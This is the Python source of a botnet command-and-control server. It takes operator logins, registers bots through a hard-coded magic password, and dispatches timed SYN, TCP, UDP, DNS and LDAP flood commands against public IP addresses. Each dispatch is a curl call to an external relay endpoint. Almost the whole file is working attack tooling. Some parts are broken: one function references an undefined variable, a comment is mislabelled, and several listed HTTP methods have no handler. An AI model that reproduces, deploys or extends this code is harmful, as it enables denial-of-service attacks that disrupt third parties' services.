# PYbot - A simple Python botnet
# Author: WodX
# Date: 27/09/2019
# CnC server

import socket
import threading
import sys
import time
import ipaddress
from colorama import Fore, init
import subprocess
from datetime import datetime, timedelta
from colorama import init, Fore, Style, Back

bots = {}
ansi_clear = '\033[2J\033[H'
def rgb_to_colorama(r, g, b):
    return f'\x1b[38;2;{r};{g};{b}m'

def generate_gradient_text(text, start_color, end_color):
    gradient_text = ""
    text_length = len(text)
    
    for i in range(text_length):
        ratio = i / (text_length - 1)
        r = int(start_color[0] * (1 - ratio) + end_color[0] * ratio)
        g = int(start_color[1] * (1 - ratio) + end_color[1] * ratio)
        b = int(start_color[2] * (1 - ratio) + end_color[2] * ratio)
        
        gradient_text += rgb_to_colorama(r, g, b) + text[i]
    
    return gradient_text

start_color = (255, 105, 180)  
end_color = (255, 255, 255)   

api = "http://serverbotnet.pythonanywhere.com/send_command"

banner = generate_gradient_text(f"""
██░ ██▓██   ██▓ ██▓███  ▓█████  ██▀███  
▓██░ ██▒▒██  ██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒
▒██▀▀██░ ▒██ ██░▓██░ ██▓▒▒███   ▓██ ░▄█ ▒
░▓█ ░██  ░ ▐██▓░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  
░▓█▒░██▓ ░ ██▒▓░▒██▒ ░  ░░▒████▒░██▓ ▒██▒
▒ ░░▒░▒  ██▒▒▒ ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
▒ ░▒░ ░▓██ ░▒░ ░▒ ░      ░ ░  ░  ░▒ ░ ▒░
░  ░░ ░▒ ▒ ░░  ░░          ░     ░░   ░ 
░  ░  ░░ ░                 ░  ░   ░   
""", start_color, end_color)

def validate_ip(ip):
    """ validate IP-address """
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

def validate_port(port, rand=False):
    """ validate port number """
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    """ validate attack duration """
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

def validate_size(size):
    """ validate buffer size """
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def find_login(username, password):
    """ read credentials from logins.txt file """
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

def send(socket, data, escape=True, reset=True):
    """ send data to client or bot """
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(method, ip, port, time):
    """ send command to all bots using curl """
    for bot in bots.keys():
        try:
            send(client, 'HELP: Shows list of commands')
        except:
            bots.pop(bot)
            bot.close()

def ping():
    """ check if all bots are still connected to C2 """
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def update_title(client, username):
    """ updates the shell title, duh? """
    while 1:
        try:
            send(client, f'\33]0;HyperC2 | Bots: {len(bots)} | Connected as: {username}\a', False)
            time.sleep(2)
        except:
            client.close()

def command_line(client):
    for x in banner.split('\n'):
        send(client, x)
    prompt = generate_gradient_text(f"• Hyper ►► ", start_color, end_color)
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()

            if command == 'HELP':
                send(client, 'HELP: Shows list of commands')
                send(client, 'METHODS: Shows list of attack methods')
                send(client, 'CLEAR: Clears the screen')
                send(client, 'LOGOUT: Disconnects from CnC server')
                send(client, '')

            elif command == 'METHODS':
                send(client, f'{Fore.LIGHTMAGENTA_EX}.syn{Fore.LIGHTWHITE_EX}: TCP SYN flood')
                send(client, f'{Fore.LIGHTMAGENTA_EX}.tcp{Fore.LIGHTWHITE_EX}: TCP junk flood')
                send(client, f'{Fore.LIGHTMAGENTA_EX}.udp{Fore.LIGHTWHITE_EX}: UDP junk flood')
                send(client, f'{Fore.LIGHTMAGENTA_EX}.dns{Fore.LIGHTWHITE_EX}: DNS Flood')
                send(client, '')
                send(client, f'{Fore.LIGHTMAGENTA_EX}.rand{Fore.LIGHTWHITE_EX}: Powerfull HTTP flood')
                send(client, f'{Fore.LIGHTMAGENTA_EX}.get{Fore.LIGHTWHITE_EX}: HTTP GET request flood')
                send(client, f'{Fore.LIGHTMAGENTA_EX}.post{Fore.LIGHTWHITE_EX}: HTTP POST request flood')
                send(client, '')

            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'LOGOUT':
                send(client, 'Goodbye :-)')
                time.sleep(1)
                break

            # Valve Source Engine query flood
            elif command == '.DNS':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                command = f'curl --silent -X POST -H "Content-Type: application/json" -d "{{\\"command\\":\\"python3 dns.py {ip} {secs} {port}\\"}}" {api}'
                                subprocess.run(command, shell=True)
                                send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Status        ►► {Fore.LIGHTBLACK_EX}Attack Deployed{Fore.LIGHTWHITE_EX}')           
                                send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Method        ►► {Fore.LIGHTBLACK_EX}DNS{Fore.LIGHTWHITE_EX}')                                                      
                                send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Host          ►► {Fore.LIGHTBLACK_EX}{ip}{Fore.LIGHTWHITE_EX}')                                            
                                send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Port          ►► {Fore.LIGHTBLACK_EX}{port}{Fore.LIGHTWHITE_EX}')                              
                                send(client, f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • Time          ►► {Fore.LIGHTBLACK_EX}{secs}{Fore.LIGHTWHITE_EX}')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .dns [IP] [PORT] [TIME]')
            elif command == '.SYN':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                
                                command = f'curl --silent -X POST -H "Content-Type: application/json" -d "{{\\"command\\":\\"python3 syn.py {ip} {secs} {port}\\"}}" {api}'
                                subprocess.run(command, shell=True)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .syn [IP] [PORT] [TIME]')
            # TCP SYNchronize flood
            elif command == '.UDP':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                command = f'curl --silent -X POST -H "Content-Type: application/json" -d "{{\\"command\\":\\"python3 udp.py {ip} {secs} {port}\\"}}" {api}'
                                subprocess.run(command, shell=True)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .udp [IP] [PORT] [TIME]')

            # TCP junk data packets flood
            elif command == '.TCP':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                command = f'curl --silent -X POST -H "Content-Type: application/json" -d "{{\\"command\\":\\"python3 tcp.py {ip} {secs} {port}\\"}}" {api}'
                                subprocess.run(command, shell=True)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .tcp [IP] [PORT] [TIME]')

            elif command == '.LDAP':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                command = f'curl --silent -X POST -H "Content-Type: application/json" -d "{{\\"command\\":\\"python3 ldap.py {ip} {secs} {port}\\"}}" {api}'
                                subprocess.run(command, shell=True)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .ldap [IP] [PORT] [TIME]')

            else:
                send(client, Fore.RED + 'Unknown Command')

            send(client, prompt, False)
        except:
            break
    client.close()

def handle_client(client, address):
    send(client, f'\33]0;PYbot | Login\a', False)

    # username login
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # password login
    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
        while not password.strip():  # i know... this is ugly...
            password = client.recv(1024).decode('cp1252').strip()
        break

    # handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    # handle bot
    else:
        # check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <c2 port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid C2 port')
        exit()
    port = int(port)

    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    sock.listen()

    threading.Thread(target=ping).start()  # start keepalive thread

    # accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()
